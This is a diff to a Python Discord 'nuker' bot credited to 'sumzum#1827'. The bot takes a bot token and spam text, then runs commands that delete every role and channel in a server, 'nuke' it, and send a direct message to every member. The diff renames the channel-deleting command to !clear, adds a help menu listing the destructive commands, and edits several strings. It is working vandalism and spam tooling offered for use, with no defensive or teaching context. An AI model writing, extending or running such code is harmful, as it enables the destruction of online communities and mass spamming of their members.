@@ -13,7 +13,7 @@ print(f"""{r}
 
 TOKEN = input("Input Bot Token: ")
 SPAM_MESSAGE = input("Input your Spam Message: ")
-CHANNEL_SPAM = input("Input your spam create Channel Name: ")
+CHANNEL_SPAM = input("Input Spam Create Channel Name: ")
 DM_ALL = input("Input Dm Message for all Members: ")
 
 bot = commands.Bot(command_prefix="!" ,help_command=None, intents=discord.Intents.all())
@@ -26,11 +26,28 @@ Bot is Online!
 
 Commands:
 1. !delroles (deletes all roles)
-2. kill server (nukes server)
+2. !kill server (nukes server)
 3. !dmall (dm all server members)
-4. !delchannels (deletes all channels)
+4. !clear (deletes all channels)
 """)
 
+@bot.command()
+async def help(ctx, member:discord.Member=None):
+     if member:
+       embed=discord.Embed(title="Nuker Help", description="made by sumzum#1827", color=0xcbceff)
+       embed.add_field(name="Delete Roles:", value="!delroles")
+       embed.add_field(name="Nuke Server:", value="!kill server")
+       embed.add_field(name="Dm Members:", value="!dmall")
+       embed.add_field(name="Delete Channels:", value="!clear")
+       await ctx.send(embed=embed)
+     else:
+       embed=discord.Embed(title="Nuker Help", description="made by sumzum#1827", color=0xcbceff)
+       embed.add_field(name="Delete Roles:", value="!delroles")
+       embed.add_field(name="Nuke Server:", value="!kill server")
+       embed.add_field(name="Dm Members:", value="!dmall")
+       embed.add_field(name="Clear Server:", value="!clear")
+       await ctx.send(embed=embed)
+  
 @bot.command()
 async def delroles(ctx):
  for role in ctx.guild.roles:  
@@ -59,11 +76,11 @@ async def dmall(ctx):
                  print(Fore.MAGENTA + f"Cannot DM{user.name}")
 
 @bot.command()
-async def delchannels(ctx):
+async def clear(ctx):
     await ctx.message.delete()
     for channel in list(ctx.guild.channels):
      await channel.delete()  
     guild = ctx.message.guild
-    await guild.create_text_channel("sumzum#1827")
+    await guild.create_text_channel("nuked")
 
 bot.run(TOKEN) 
